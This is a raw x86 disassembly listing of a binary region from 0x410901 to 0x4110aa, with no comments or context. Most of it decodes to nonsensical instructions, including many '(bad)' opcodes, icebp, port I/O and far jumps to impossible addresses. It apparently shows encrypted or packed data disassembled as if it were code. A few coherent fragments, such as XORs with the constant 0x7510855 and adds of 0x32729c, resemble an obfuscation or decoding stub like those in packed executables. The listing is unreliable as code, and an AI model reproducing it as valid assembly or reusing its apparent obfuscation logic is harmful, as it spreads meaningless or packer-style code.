  410901:	bound  ebp,QWORD PTR [ecx-0x4c21a492]
  410907:	cmp    DWORD PTR [eax-0x60],edx
  41090a:	and    al,0x86
  41090c:	lea    esi,[ebp-0x5c]
  41090f:	jae    0x41094a
  410911:	lods   eax,DWORD PTR ds:[esi]
  410912:	pop    es
  410913:	xlat   BYTE PTR ds:[ebx]
  410914:	stc    
  410915:	mov    bh,0x30
  410917:	dec    edx
  410918:	bnd jl 0x41091b
  41091b:	or     esp,esp
  41091d:	hlt    
  41091e:	cld    
  41091f:	adc    cl,BYTE PTR [esi+0x55]
  410922:	jbe    0x410966
  410924:	push   ebp
  410925:	mov    cl,0x11
  410927:	mov    ebp,DWORD PTR [ebx-0x63b0901f]
  41092d:	aas    
  41092e:	xchg   esi,eax
  41092f:	stos   BYTE PTR es:[edi],al
  410930:	sbb    al,0x4d
  410932:	ficomp WORD PTR [esi+edx*2]
  410935:	mov    gs,WORD PTR [ecx-0x34]
  410938:	xor    al,0x86
  41093a:	xor    ebp,DWORD PTR [esi]
  41093c:	add    BYTE PTR [edi+esi*1],ch
  41093f:	(bad)  
  410940:	les    esi,FWORD PTR [ecx]
  410942:	xchg   esi,eax
  410943:	xchg   ebp,eax
  410944:	mov    ch,0x5
  410946:	fisub  WORD PTR [ebp-0x77]
  410949:	add    esp,DWORD PTR ds:0x3d367ac3
  41094f:	loopne 0x4108f7
  410951:	and    DWORD PTR [eax-0x20],ecx
  410954:	inc    esp
  410955:	aas    
  410956:	adc    ebp,ecx
  410958:	xchg   ebp,eax
  410959:	mov    ch,al
  41095b:	or     DWORD PTR [ebx+0x41],eax
  41095e:	mov    bl,0xf
  410960:	cli    
  410961:	and    BYTE PTR [edi+edi*4],ah
  410964:	push   edx
  410965:	aas    
  410966:	popf   
  410967:	inc    ecx
  410969:	aam    0x67
  41096b:	outs   dx,BYTE PTR ds:[esi]
  41096c:	test   DWORD PTR [esp+edi*1],eax
  41096f:	cmp    BYTE PTR [esi+eax*8+0x758d3c9b],0x60
  410977:	loope  0x4109bf
  410979:	xchg   ecx,eax
  41097a:	sar    DWORD PTR [esi-0x6d],1
  41097d:	out    0x70,eax
  41097f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410980:	popf   
  410981:	sub    edi,DWORD PTR [eax+0x115acc75]
  410987:	sti    
  410988:	or     BYTE PTR [ebx+0x951d86c],ah
  41098e:	xchg   esp,eax
  41098f:	neg    BYTE PTR [edx]
  410991:	call   0x34fe4582
  410996:	icebp  
  410997:	jae    0x41097e
  410999:	pop    ecx
  41099a:	out    dx,al
  41099b:	jns    0x4109f3
  41099d:	xor    al,BYTE PTR ds:0x229094e0
  4109a3:	inc    ecx
  4109a4:	sub    ch,BYTE PTR [edi+0x5]
  4109a7:	pop    ebx
  4109a8:	mov    dh,BYTE PTR [ecx-0x355c6d7d]
  4109ae:	jae    0x4109bd
  4109b0:	xchg   edi,eax
  4109b1:	adc    ah,BYTE PTR [edx+esi*8]
  4109b4:	inc    DWORD PTR [edx-0x709f5da4]
  4109ba:	enter  0x4194,0x2b
  4109be:	es push edi
  4109c0:	daa    
  4109c1:	dec    edx
  4109c2:	mov    ch,0x6d
  4109c4:	dec    ebx
  4109c5:	call   0x1d621f45
  4109ca:	sahf   
  4109cb:	and    bl,cl
  4109cd:	stos   DWORD PTR es:[edi],eax
  4109ce:	scas   al,BYTE PTR es:[edi]
  4109cf:	mov    ss,WORD PTR [ebp+0xd]
  4109d2:	cmp    al,0x75
  4109d4:	mov    cl,0x36
  4109d6:	lahf   
  4109d7:	aaa    
  4109d8:	cmp    BYTE PTR [eax],cl
  4109da:	and    BYTE PTR [eax-0x35],cl
  4109dd:	jg     0x410a24
  4109df:	add    bl,cl
  4109e1:	lods   eax,DWORD PTR ds:[esi]
  4109e2:	mov    ebp,0x3c9263a5
  4109e7:	cmp    BYTE PTR [esi],ch
  4109e9:	bnd jmp 0xac3e1819
  4109ef:	ins    BYTE PTR es:[edi],dx
  4109f0:	xor    BYTE PTR [edx+esi*1-0x26c550ad],ch
  4109f7:	and    BYTE PTR [eax+0x66],ah
  4109fa:	in     eax,0xe7
  4109fc:	pop    esi
  4109fd:	jmp    0x9c06fc5e
  410a02:	pop    eax
  410a03:	dec    eax
  410a04:	xchg   esi,eax
  410a05:	and    al,0x57
  410a07:	push   ss
  410a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a09:	cld    
  410a0a:	leave  
  410a0b:	and    al,0x61
  410a0d:	data16 cmp bh,BYTE PTR [esi-0x4d]
  410a11:	pop    eax
  410a12:	in     al,dx
  410a13:	cmp    esi,edx
  410a15:	retf   0x5e80
  410a18:	inc    esi
  410a19:	mov    al,0xa5
  410a1b:	shl    DWORD PTR [edi+0xc],1
  410a1e:	or     BYTE PTR [edi+ecx*4-0x96695b],al
  410a25:	dec    ebx
  410a26:	jnp    0x4109f8
  410a28:	sbb    al,BYTE PTR [ebx+0x209874b9]
  410a2e:	and    eax,0xe41f35ff
  410a33:	adc    DWORD PTR [esi],edx
  410a35:	jo     0x410a8d
  410a37:	(bad)  
  410a38:	jo     0x410a28
  410a3a:	sub    eax,0x78
  410a3d:	rcl    dl,0xcb
  410a40:	push   esp
  410a41:	cmc    
  410a42:	and    dh,BYTE PTR [ebp+0x16]
  410a45:	cmc    
  410a46:	jmp    0x410a11
  410a48:	dec    ebp
  410a49:	mov    dh,0xda
  410a4b:	jecxz  0x4109e5
  410a4d:	je     0x410a30
  410a4f:	adc    cl,ch
  410a51:	dec    esp
  410a52:	int    0x6c
  410a54:	push   ds
  410a55:	push   0xffffff95
  410a57:	js     0x410ac1
  410a59:	and    DWORD PTR [ebp+ebx*8-0x66f54757],eax
  410a60:	je     0x410a64
  410a62:	inc    eax
  410a63:	inc    edi
  410a64:	(bad)  
  410a65:	leave  
  410a66:	and    DWORD PTR [ecx+0x1e8c6754],ebx
  410a6c:	scas   eax,DWORD PTR es:[edi]
  410a6d:	dec    edi
  410a6e:	in     eax,0x86
  410a70:	pop    ds
  410a71:	add    BYTE PTR [ebp-0x2e7a464e],ah
  410a77:	jl     0x410a0c
  410a79:	xchg   ebp,eax
  410a7a:	addr16 dec edx
  410a7c:	scas   al,BYTE PTR es:[edi]
  410a7d:	mov    ebp,0xeaf29b8b
  410a82:	sub    eax,0x49ad9cb5
  410a87:	xor    ecx,DWORD PTR [edx]
  410a89:	push   ecx
  410a8a:	xchg   ecx,eax
  410a8b:	shl    DWORD PTR [eax+0x2dcb5a00],cl
  410a91:	xchg   edi,eax
  410a92:	push   0xffffffda
  410a94:	jns    0x410a38
  410a96:	xchg   esi,eax
  410a97:	pop    es
  410a98:	popa   
  410a99:	dec    esp
  410a9a:	pop    esp
  410a9b:	push   0xffffff92
  410a9d:	leave  
  410a9e:	das    
  410a9f:	push   ecx
  410aa0:	mov    cl,0xd5
  410aa2:	or     ebx,ebx
  410aa4:	or     dh,BYTE PTR [ecx-0x38]
  410aa7:	add    al,BYTE PTR ds:0x4c3dce47
  410aad:	nop
  410aae:	out    0x77,eax
  410ab0:	retf   
  410ab1:	outs   dx,DWORD PTR ds:[esi]
  410ab2:	pop    edi
  410ab3:	(bad)  
  410ab4:	fisttp DWORD PTR [edi+0x54]
  410ab7:	push   ecx
  410ab8:	pop    es
  410ab9:	mov    ah,0x79
  410abb:	xor    DWORD PTR [ecx-0x54],ebp
  410abe:	ds repnz and eax,0x7e1170a6
  410ac5:	pop    es
  410ac6:	add    al,ch
  410ac8:	stc    
  410ac9:	xchg   esi,eax
  410aca:	jp     0x410b40
  410acc:	or     ebp,DWORD PTR [esi-0x5b4393d3]
  410ad2:	push   ds
  410ad3:	test   BYTE PTR [ebx-0x3b],0xc7
  410ad7:	jge    0x410b38
  410ad9:	shr    BYTE PTR [ebx],0xec
  410adc:	es mov al,0xac
  410adf:	sub    al,0x59
  410ae1:	icebp  
  410ae2:	add    cl,BYTE PTR [ebp-0x4f8f35c7]
  410ae8:	or     eax,0x51c23fb0
  410aed:	inc    esp
  410aee:	shr    ebx,1
  410af0:	push   ebx
  410af1:	pop    ebx
  410af2:	loop   0x410b08
  410af4:	sti    
  410af5:	les    ebx,FWORD PTR [ebp-0x55]
  410af8:	pop    edi
  410af9:	jmp    0xe9a8:0x9ac1b8d6
  410b00:	sbb    bh,BYTE PTR [edx+eax*2-0x4eb2dcc9]
  410b07:	retf   0xd0c
  410b0a:	cmp    al,dl
  410b0c:	nop
  410b0d:	dec    ebx
  410b0e:	loope  0x410b09
  410b10:	repz push esp
  410b12:	adc    DWORD PTR [esi+0x11],ecx
  410b15:	daa    
  410b16:	push   esi
  410b17:	sub    edi,eax
  410b19:	(bad)  
  410b1a:	fcmovne st,st(2)
  410b1c:	mov    cl,0xfd
  410b1e:	jp     0x410b70
  410b20:	in     eax,dx
  410b21:	stos   DWORD PTR es:[edi],eax
  410b22:	test   al,0x47
  410b24:	pushf  
  410b25:	std    
  410b26:	xchg   ebp,eax
  410b27:	sbb    eax,DWORD PTR [esp+edx*8]
  410b2a:	fbld   TBYTE PTR [edx+0x1d1674b5]
  410b30:	jl     0x410b66
  410b32:	rol    DWORD PTR [ebx+0x72],0x46
  410b36:	jb     0x410b6a
  410b38:	or     BYTE PTR [edi-0x19],bh
  410b3b:	stos   BYTE PTR es:[edi],al
  410b3c:	mov    esp,0x726fb70f
  410b41:	adc    eax,0x83c97f15
  410b46:	jmp    0x579d7d32
  410b4b:	dec    edi
  410b4c:	sub    al,0x56
  410b4e:	jns    0x410bb2
  410b50:	pop    eax
  410b51:	popa   
  410b52:	xchg   ebp,eax
  410b53:	les    ebx,FWORD PTR [ecx+0x219c837f]
  410b59:	out    dx,al
  410b5a:	adc    al,0xb
  410b5c:	mov    dh,0xc4
  410b5e:	pop    esp
  410b5f:	jnp    0x410b63
  410b61:	cmp    DWORD PTR [esi+0x54],eax
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz je 0x410bd2
  410ba6:	mov    esp,0x7070423e
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c26
  410bb1:	add    al,0x35
  410bb3:	push   ss
  410bb4:	jo     0x410b90
  410bb6:	dec    esp
  410bb7:	shl    BYTE PTR [eax+ecx*4],0x89
  410bbb:	dec    ebx
  410bbc:	das    
  410bbd:	xchg   edx,ecx
  410bbf:	ror    BYTE PTR [edi+0x48f75ce9],1
  410bc5:	sbb    edi,esi
  410bc7:	out    dx,al
  410bc8:	mov    dh,0xcc
  410bca:	call   0xd387:0xc3fe7121
  410bd1:	je     0xb5f0c9e8
  410bd7:	fstp   QWORD PTR [edi-0x61b6e13a]
  410bdd:	lods   al,BYTE PTR ds:[esi]
  410bde:	or     eax,0xde7c473c
  410be3:	test   eax,0x49a8afd9
  410be8:	out    0x13,al
  410bea:	xchg   DWORD PTR [edx-0x3b75274b],esi
  410bf0:	mov    ch,0x58
  410bf2:	stos   BYTE PTR es:[edi],al
  410bf3:	jne    0x410bea
  410bf5:	cdq    
  410bf6:	mov    esi,0xfa6e5b63
  410bfb:	clc    
  410bfc:	push   ecx
  410bfd:	pusha  
  410bfe:	and    dh,ch
  410c00:	jle    0x410c44
  410c02:	dec    edx
  410c03:	pop    ss
  410c04:	inc    ecx
  410c05:	inc    ecx
  410c06:	cdq    
  410c07:	xor    edi,ebx
  410c09:	jge    0x410bca
  410c0b:	adc    eax,0x87f92502
  410c10:	pop    es
  410c11:	enter  0x7d45,0xdc
  410c15:	mov    ch,0xea
  410c17:	xchg   BYTE PTR [esi+0x3d],bl
  410c1a:	mov    es,WORD PTR [esi+0x12]
  410c1d:	(bad)  
  410c1e:	pop    edx
  410c1f:	inc    esp
  410c20:	inc    ebp
  410c21:	mov    dh,0xd9
  410c23:	mov    eax,DWORD PTR [esi+0x27a21ffe]
  410c29:	gs stos BYTE PTR es:[edi],al
  410c2b:	cmc    
  410c2c:	and    BYTE PTR [ebx-0x7a],0x54
  410c30:	dec    ebx
  410c31:	pop    eax
  410c32:	dec    ebp
  410c33:	mov    edi,0x3f9797b3
  410c38:	ret    0x3e2
  410c3b:	adc    al,BYTE PTR [eax-0x1f]
  410c3e:	and    eax,0xb4684b26
  410c43:	dec    ecx
  410c44:	push   0x2
  410c46:	js     0x410c27
  410c48:	mov    cl,0xc2
  410c4a:	jno    0x410c7a
  410c4c:	adc    BYTE PTR [esi],al
  410c4e:	lods   eax,DWORD PTR ds:[esi]
  410c4f:	div    DWORD PTR [edx]
  410c51:	jbe    0x410c3e
  410c53:	sbb    al,0x4a
  410c55:	sub    cl,BYTE PTR [edx-0xa]
  410c58:	cmc    
  410c59:	lds    edi,FWORD PTR [ebp-0x4851db79]
  410c5f:	neg    DWORD PTR [edi-0x3a]
  410c62:	lock mov ecx,0x768731d1
  410c68:	adc    DWORD PTR [eax],ecx
  410c6a:	mov    dl,0x1b
  410c6c:	test   al,0x36
  410c6e:	js     0x410c23
  410c70:	xchg   edi,eax
  410c71:	call   0xf70b:0x7152cddd
  410c78:	push   cs
  410c79:	xor    al,0xd9
  410c7b:	cmp    ebx,DWORD PTR ds:[eax+ebx*2-0x5f]
  410c80:	mov    ds,WORD PTR [ecx]
  410c82:	adc    al,0x92
  410c84:	mov    edi,0xb5882ca
  410c89:	sbb    eax,0x829b640e
  410c8e:	in     eax,0x98
  410c90:	fidivr DWORD PTR [esi]
  410c92:	or     ecx,DWORD PTR [ebp+0x52]
  410c95:	cli    
  410c96:	sub    BYTE PTR [edi+0x5b405d60],0xf
  410c9d:	cmc    
  410c9e:	and    ch,ah
  410ca0:	add    bl,bh
  410ca2:	in     eax,0x76
  410ca4:	mov    ebp,0xb8fae10d
  410ca9:	push   es
  410caa:	and    eax,DWORD PTR [edi+eiz*8-0x18]
  410cae:	dec    eax
  410caf:	push   eax
  410cb0:	jp     0x410cf5
  410cb2:	fdiv   DWORD PTR [edi]
  410cb4:	mov    ch,0xca
  410cb6:	aas    
  410cb7:	pop    ebp
  410cb8:	add    al,BYTE PTR [ebx+ebp*1-0x494ba3c7]
  410cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cc0:	sar    DWORD PTR [esi+0x39],0x91
  410cc4:	mov    ebx,ecx
  410cc6:	(bad)  
  410cc7:	in     al,0x3a
  410cc9:	out    dx,eax
  410cca:	fcomp  st(5)
  410ccc:	ins    DWORD PTR es:[edi],dx
  410ccd:	xchg   DWORD PTR [eax+esi*4-0x48955312],edx
  410cd4:	repnz hlt 
  410cd6:	adc    eax,0x56208233
  410cdb:	fadd   QWORD PTR [ebx+edx*4-0x71]
  410cdf:	out    dx,eax
  410ce0:	(bad)  
  410ce1:	lea    ecx,[ebx]
  410ce3:	pop    edi
  410ce4:	sub    ah,BYTE PTR ds:0xf8405484
  410cea:	mov    al,0x7f
  410cec:	arpl   WORD PTR es:[esi-0x1449b845],dx
  410cf3:	in     al,0x5d
  410cf5:	jl     0x410ce3
  410cf7:	neg    BYTE PTR [ebx-0x5f]
  410cfa:	xchg   edx,eax
  410cfb:	mov    edi,0x4a0f7202
  410d00:	or     esi,DWORD PTR [ecx]
  410d02:	mov    dh,0xd8
  410d04:	(bad)  
  410d05:	or     al,0xa5
  410d07:	outs   dx,BYTE PTR ds:[esi]
  410d08:	lock xor al,0x7c
  410d0b:	mov    edi,0xe2ee9f21
  410d10:	popf   
  410d11:	fld    TBYTE PTR [ebp-0xd]
  410d14:	dec    eax
  410d15:	mov    cs,WORD PTR [ecx-0x3b]
  410d18:	cwde   
  410d19:	addr16 sub cl,dh
  410d1c:	ror    DWORD PTR [edx-0x11e218b],1
  410d22:	cdq    
  410d23:	dec    edi
  410d24:	pop    esi
  410d25:	pusha  
  410d26:	push   edx
  410d27:	jae    0x410cac
  410d29:	scas   al,BYTE PTR es:[edi]
  410d2a:	fcomip st,st(2)
  410d2c:	mov    ds:0xb95a60d0,eax
  410d31:	mov    ds,WORD PTR [edx+0x78]
  410d34:	shl    BYTE PTR [esi-0x15877ac4],0x1a
  410d3b:	dec    eax
  410d3c:	es pop ecx
  410d3e:	jmp    0xc740:0x13e6dffd
  410d45:	mov    WORD PTR [ebx-0x22],ds
  410d48:	jo     0x410dc5
  410d4a:	ds sub edx,ebx
  410d4d:	mov    ebp,0xe1658d3a
  410d52:	pop    edx
  410d53:	daa    
  410d54:	inc    esi
  410d55:	popa   
  410d56:	jp     0x410d6b
  410d58:	in     al,0x49
  410d5a:	add    ah,BYTE PTR [ebx]
  410d5c:	push   0x67
  410d5e:	dec    esi
  410d5f:	mov    ds:0xec7bd86c,al
  410d64:	mov    cl,0x2d
  410d66:	jle    0x410dd1
  410d68:	dec    esi
  410d69:	and    DWORD PTR [edi+0x3c0cd215],ecx
  410d6f:	xchg   ecx,eax
  410d70:	sahf   
  410d71:	or     al,0xee
  410d73:	test   DWORD PTR ss:[ecx+0x1f],esi
  410d77:	sbb    BYTE PTR [ebx-0x2c53f179],0x40
  410d7e:	mov    WORD PTR [ecx+0xfffbe11],ss
  410d84:	jmp    DWORD PTR [bp-0x1024]
  410d89:	add    eax,0xeddce5dd
  410d8e:	jmp    0x410e0e
  410d90:	(bad)  [ecx]
  410d92:	ss enter 0xe0bc,0xe4
  410d97:	mov    BYTE PTR [ecx],cl
  410d99:	(bad)  
  410d9a:	ins    DWORD PTR es:[edi],dx
  410d9b:	and    eax,0x8c857508
  410da0:	pop    edi
  410da1:	pop    ecx
  410da2:	dec    edi
  410da3:	jmp    0x1fb0:0x40d2f08d
  410daa:	and    al,BYTE PTR [esi+edx*1]
  410dad:	mov    ecx,DWORD PTR [eax-0x31]
  410db0:	nop
  410db1:	sbb    ch,BYTE PTR [esi+0x3a9a7c8a]
  410db7:	hlt    
  410db8:	xor    BYTE PTR [esp+ecx*8],cl
  410dbb:	xlat   BYTE PTR ds:[ebx]
  410dbc:	xchg   ebx,eax
  410dbd:	arpl   WORD PTR [ecx-0x6a23ad4e],di
  410dc3:	(bad)  
  410dc4:	out    dx,al
  410dc5:	shl    BYTE PTR [ebx-0x6b65d5ed],1
  410dcb:	mov    eax,ds:0xe4601b10
  410dd0:	(bad)  
  410dd1:	xchg   ebx,eax
  410dd2:	xor    ah,BYTE PTR [edx]
  410dd4:	or     DWORD PTR [eax+0x4e],edx
  410dd7:	out    dx,al
  410dd8:	lock or BYTE PTR [eax-0x4f765e94],dl
  410ddf:	adc    dl,0xc1
  410de2:	test   BYTE PTR [ebp-0x2f57de46],bl
  410de8:	push   0x8c87ba9d
  410ded:	js     0x410ddf
  410def:	push   cs
  410df0:	arpl   WORD PTR [ebp+0x1],si
  410df3:	je     0x410e47
  410df5:	stos   DWORD PTR es:[edi],eax
  410df6:	xchg   ebp,eax
  410df7:	das    
  410df8:	or     DWORD PTR [esi+0xb],ecx
  410dfb:	gs pop es
  410dfd:	std    
  410dfe:	ret    0x24c7
  410e01:	das    
  410e02:	popf   
  410e03:	xor    DWORD PTR [eax-0x27],edi
  410e06:	hlt    
  410e07:	cdq    
  410e08:	out    dx,al
  410e09:	fidiv  WORD PTR [edx+0x69]
  410e0c:	mov    dl,0x10
  410e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e0f:	fsubr  QWORD PTR [ecx-0x7e]
  410e12:	jp     0x410e20
  410e14:	cs sub eax,0xd7aa2bf3
  410e1a:	mov    BYTE PTR [edi+eax*8+0x1dfbfcbc],dl
  410e21:	repnz not BYTE PTR [edx+0x4d]
  410e25:	mov    ch,0xa6
  410e27:	jg     0x410e45
  410e29:	in     eax,dx
  410e2a:	lds    eax,FWORD PTR [eax-0x7ebaa53b]
  410e30:	dec    ebp
  410e31:	cdq    
  410e32:	aam    0xc1
  410e34:	mov    ebx,0x88fa7bbc
  410e39:	push   0x25
  410e3b:	shl    dh,1
  410e3d:	mov    ecx,0xf67313b5
  410e42:	(bad)  
  410e43:	aam    0xb4
  410e45:	pop    edi
  410e46:	icebp  
  410e47:	push   es
  410e48:	stos   DWORD PTR es:[edi],eax
  410e49:	pop    ebx
  410e4a:	enter  0x7318,0x1b
  410e4e:	pop    eax
  410e4f:	mov    BYTE PTR [ebx-0x75],al
  410e52:	cmp    al,0x63
  410e54:	cmp    DWORD PTR [edi+0x54],edi
  410e57:	jae    0x410e50
  410e59:	(bad)  
  410e5a:	test   DWORD PTR [edx-0x29852577],esi
  410e60:	rcl    BYTE PTR [esi],cl
  410e62:	add    al,0x4
  410e64:	int    0xf3
  410e66:	outs   dx,BYTE PTR ds:[esi]
  410e67:	and    BYTE PTR [ecx-0x5b],bl
  410e6a:	dec    ecx
  410e6b:	sbb    al,0xe5
  410e6d:	xchg   esp,eax
  410e6e:	test   eax,0x18db41d5
  410e73:	jl     0x410e5d
  410e75:	xor    dl,dh
  410e77:	add    BYTE PTR [ecx+0x6c6c4e18],dl
  410e7d:	mov    eax,0x36cdf460
  410e82:	push   0x21eae546
  410e87:	xlat   BYTE PTR ds:[ebx]
  410e88:	mov    ebp,0xd083de41
  410e8d:	iret   
  410e8e:	pop    edx
  410e8f:	jb     0x410e8c
  410e91:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e93:	add    ecx,DWORD PTR [edi-0x757fed6e]
  410e99:	adc    eax,0xa11cb28
  410e9e:	sbb    BYTE PTR [edi],bh
  410ea0:	pushf  
  410ea1:	lea    edi,[ebx+0x7185eb4c]
  410ea7:	adc    ax,0x892e
  410eab:	imul   ebp,DWORD PTR [ecx],0x79
  410eae:	pop    ds
  410eaf:	pushf  
  410eb0:	lds    ecx,FWORD PTR [ebx]
  410eb2:	adc    eax,0x82986d9e
  410eb7:	xor    DWORD PTR [esi-0x214e4615],esi
  410ebd:	fld    st(3)
  410ebf:	adc    al,BYTE PTR ds:0x2e3ab391
  410ec5:	in     eax,0xc3
  410ec7:	fsubr  st,st(6)
  410ec9:	mov    ebx,esp
  410ecb:	and    BYTE PTR [edi-0x7ec207dd],bh
  410ed1:	or     DWORD PTR [ebp+0x348c5677],esi
  410ed7:	(bad)  
  410ed8:	call   0x33c9:0x1382d8c
  410edf:	in     eax,0x84
  410ee1:	fsubr  st,st(6)
  410ee3:	sahf   
  410ee4:	pop    esp
  410ee5:	cmp    DWORD PTR [ebx],0xfcc524dc
  410eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eec:	push   edi
  410eed:	lods   al,BYTE PTR ds:[esi]
  410eee:	push   eax
  410eef:	xor    dl,BYTE PTR [eax]
  410ef1:	xchg   esp,eax
  410ef2:	pop    esi
  410ef3:	cs pop ebx
  410ef5:	dec    edi
  410ef6:	rcr    BYTE PTR cs:[ebx],cl
  410ef9:	mov    edi,0x239561d1
  410efe:	cmp    BYTE PTR [ebx+0x50],dh
  410f01:	lea    ebx,[eax+0x4e200eb9]
  410f07:	loop   0x410ead
  410f09:	sbb    ch,BYTE PTR [esi]
  410f0b:	sub    al,0x78
  410f0d:	xchg   ebx,eax
  410f0e:	mov    edx,0x356687a7
  410f13:	xor    DWORD PTR ds:0x3d4f5c1c,ecx
  410f19:	dec    esp
  410f1a:	popf   
  410f1b:	(bad)  
  410f1c:	cli    
  410f1d:	fst    DWORD PTR [edx-0x59]
  410f20:	cmp    eax,0x4b42325f
  410f25:	sbb    DWORD PTR [eax+0x77],esi
  410f28:	pop    esp
  410f29:	jge    0x410f11
  410f2b:	jg     0x410ed8
  410f2d:	in     al,0x11
  410f2f:	or     dh,dl
  410f31:	(bad)  
  410f32:	je     0x410f3e
  410f34:	mov    ch,0xb8
  410f36:	dec    edi
  410f37:	je     0x410f51
  410f39:	xchg   ebp,eax
  410f3a:	je     0x410ec6
  410f3c:	sbb    cl,BYTE PTR [ecx-0x61]
  410f3f:	mov    esp,DWORD PTR [ebx-0x13]
  410f42:	std    
  410f43:	and    esi,DWORD PTR [esi]
  410f45:	daa    
  410f46:	push   ss
  410f47:	jmp    0x38b3a9b2
  410f4c:	dec    eax
  410f4d:	add    al,0x2a
  410f4f:	icebp  
  410f50:	call   FWORD PTR [edx-0x16]
  410f53:	ffreep st(5)
  410f55:	call   0x4453:0xaa13f211
  410f5c:	imul   edx,DWORD PTR [edi+0x4c7b453e],0xa00b0cfd
  410f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f67:	out    0xb8,eax
  410f69:	mov    DWORD PTR [ecx-0x3d],ebp
  410f6c:	inc    ecx
  410f6d:	sbb    al,0x58
  410f6f:	test   BYTE PTR [ebx+0x73aa83b5],ah
  410f75:	inc    eax
  410f76:	mov    dh,0x4e
  410f78:	add    eax,0xe9d41039
  410f7d:	hlt    
  410f7e:	idiv   DWORD PTR [edx-0x1e]
  410f81:	add    esi,edi
  410f83:	gs gs push ss
  410f86:	mov    ah,0x28
  410f88:	dec    ch
  410f8a:	fisttp WORD PTR [edx+0x25]
  410f8d:	push   edx
  410f8e:	lock sbb BYTE PTR [ecx],al
  410f91:	lock mov dl,0xc2
  410f94:	leave  
  410f95:	test   BYTE PTR [ecx-0x4dd35e15],0x41
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x3299e92d]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f62
  410fdd:	adc    eax,0x7a47ac3b
  410fe2:	xchg   ecx,eax
  410fe3:	lahf   
  410fe4:	adc    edx,esp
  410fe6:	(bad)  
  410fe7:	fisttp QWORD PTR [edx+eax*1-0x5a]
  410feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fec:	and    ebx,DWORD PTR [eax+0x7b]
  410fef:	ror    esp,0xec
  410ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ff3:	sub    ch,dl
  410ff5:	jo     0x411071
  410ff7:	or     eax,0xafcc0f53
  410ffc:	jne    0x410f7e
  410ffe:	or     WORD PTR [ebx+0x6ba1b9cf],0xffc7
  411006:	add    DWORD PTR [ecx-0x3e],0x8b49095c
  41100d:	mov    edi,0x3b4638f2
  411012:	test   DWORD PTR [esi],ebx
  411014:	fnsave [ecx-0x74b0507]
  41101a:	mov    ds:0xe22cce5e,eax
  41101f:	repnz ficomp DWORD PTR [eax+0x56]
  411023:	retf   0x7ff1
  411026:	ins    BYTE PTR es:[edi],dx
  411027:	aad    0x4d
  411029:	jnp    0x410ff5
  41102b:	jl     0x410fe7
  41102d:	sbb    al,0x78
  41102f:	inc    eax
  411030:	not    BYTE PTR [ebx-0x7]
  411033:	inc    esp
  411034:	cld    
  411035:	jge    0x411097
  411037:	cwde   
  411038:	int3   
  411039:	dec    ecx
  41103a:	jbe    0x4110a2
  41103c:	pop    es
  41103d:	cmp    DWORD PTR [esi+0x38aa6655],edx
  411043:	(bad)  
  411044:	lods   eax,DWORD PTR ds:[esi]
  411045:	(bad)  
  411047:	xor    dh,BYTE PTR [edx-0x30b451e3]
  41104d:	jle    0x411021
  41104f:	pop    esp
  411050:	icebp  
  411051:	xchg   edx,eax
  411052:	imul   ecx,DWORD PTR ds:0x13f0ae7a,0x1
  411059:	mov    cl,0x23
  41105b:	mov    bh,0xd1
  41105d:	mov    BYTE PTR [ebp-0x4f13d460],bl
  411063:	das    
  411064:	es loop 0x411028
  411067:	sbb    BYTE PTR [ecx+0x48],0xec
  41106b:	jno    0x4110a1
  41106d:	dec    edx
  41106e:	mov    eax,es
  411070:	(bad)  
  411071:	xchg   esp,eax
  411072:	xor    ch,0x9b
  411075:	sbb    al,0xda
  411077:	push   ss
  411078:	mov    edi,0x24b72995
  41107d:	and    eax,0x5dff81cf
  411082:	lods   eax,DWORD PTR ds:[esi]
  411083:	sub    al,0x92
  411085:	pop    ds
  411086:	fisttp DWORD PTR [esi]
  411088:	jbe    0x411018
  41108a:	or     ebp,DWORD PTR [esp+0xf]
  41108e:	dec    esi
  41108f:	fdivr  st,st(1)
  411091:	data16 sbb ah,bl
  411094:	pop    edi
  411095:	les    ebp,FWORD PTR [esi]
  411097:	outs   dx,DWORD PTR ds:[esi]
  411098:	xchg   esp,eax
  411099:	(bad)  
  41109a:	push   ebx
  41109b:	hlt    
  41109c:	cmovl  ecx,DWORD PTR [edi]
  41109f:	jecxz  0x41105c
  4110a1:	pop    esi
  4110a2:	js     0x411103
  4110a4:	test   DWORD PTR [ecx],ecx
  4110a6:	push   ebx
  4110a7:	push   cs
  4110a8:	adc    al,0x2f
  4110aa:	fidivr DWORD PTR [eax+0x6f]
